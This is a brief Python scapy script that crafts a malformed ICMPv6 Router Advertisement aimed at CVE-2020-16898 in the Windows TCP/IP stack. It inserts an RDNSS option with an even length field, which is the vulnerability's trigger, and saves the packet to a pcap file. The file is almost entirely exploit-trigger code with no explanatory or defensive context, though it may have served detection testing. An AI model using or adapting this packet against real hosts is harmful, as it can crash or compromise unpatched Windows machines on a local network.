#!/usr/bin/python3
"""
Hints and tips referenced from:
https://github.com/advanced-threat-research/CVE-2020-16898/blob/main/cve-2020-16898.lua#L39
"""

from scapy.all import *
from binascii import unhexlify

pStr = '33 33 00 00 00 01 D4 21 22 76 5B 78 86 DD 60 00 00 00 00 38 3A FF FE 80 00 00 00 00 00 00 00 00 00 00 00 00 00 01 FF 02 00 00 00 00 00 00 00 00 00 00 00 00 00 01 86 00 15 53 FF 48 07 08 00 00 75 30 00 00 03 E8 03 04 40 C0 00 09 3A 80 00 01 51 80 00 00 00 00 20 03 00 50 AA 10 42 43 00 00 00 00 00 00 00 00 05 01 00 00 00 00 05 D4'
p = Ether(unhexlify(pStr.replace(' ', '')))

origPkt = p.copy()

origPkt[Ether].src = 'ff:ff:ff:ff:ff:ff'                                       ## Router MAC
origPkt[Ether].dst = 'ff:ff:ff:ff:ff:ff'                                       ## Target MAC
origPkt[IPv6].src = '0:0:0:0:0:0:0:0'                                          ## Router IPv6
origPkt[IPv6].dst = '0:0:0:0:0:0:0:0'                                          ## Target IPv6
del origPkt[IPv6].plen
del origPkt[ICMPv6ND_RA].cksum
append = origPkt[ICMPv6NDOptMTU].copy()
del origPkt[ICMPv6NDOptMTU]
z=ICMPv6NDOptRDNSS()
z.len = 2
midPkt = origPkt/z/append
newPkt = midPkt.__class__(midPkt)
wrpcap('CVE-2020-16898.pcap', newPkt)
ourCVE = rdpcap('CVE-2020-16898.pcap')

